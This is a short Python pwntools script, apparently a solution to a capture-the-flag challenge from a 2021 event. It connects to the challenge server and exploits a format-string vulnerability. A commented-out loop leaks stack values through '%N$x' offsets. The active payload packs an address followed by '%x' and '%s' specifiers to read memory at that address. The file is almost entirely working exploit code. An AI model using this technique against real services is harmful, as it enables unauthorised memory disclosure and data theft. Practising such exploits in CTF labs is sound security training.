from pwn import *
from binascii import unhexlify
# input("attach gdb")
#  Compile using: gcc -o pwn3 pwn3

context.log_level = 'critical'

# for offset in range(0, 500): 
#     p = remote('hack.scythe2021.sdslabs.co', 18137)
#     p.recvuntil("\n")
#     # print(message)
#     payload = '%{}$x'.format(offset)
#     p.sendline(payload)
#     response = p.recv()
#     # print(response)
#     try:
#         response = response.strip()
#         print(unhexlify(response[2:]))
#         p.close()
#     except:
#         continue

p = remote('hack.scythe2021.sdslabs.co', 18137)
p.recvuntil("\n")
# print(message)
# payload = '%{}$x'.format(offset)
payload = '\x40\xa0\x04\x08 %x %x %x %x %x %x %s'
p.sendline(payload)
response = p.recv()
print(response)
p.close()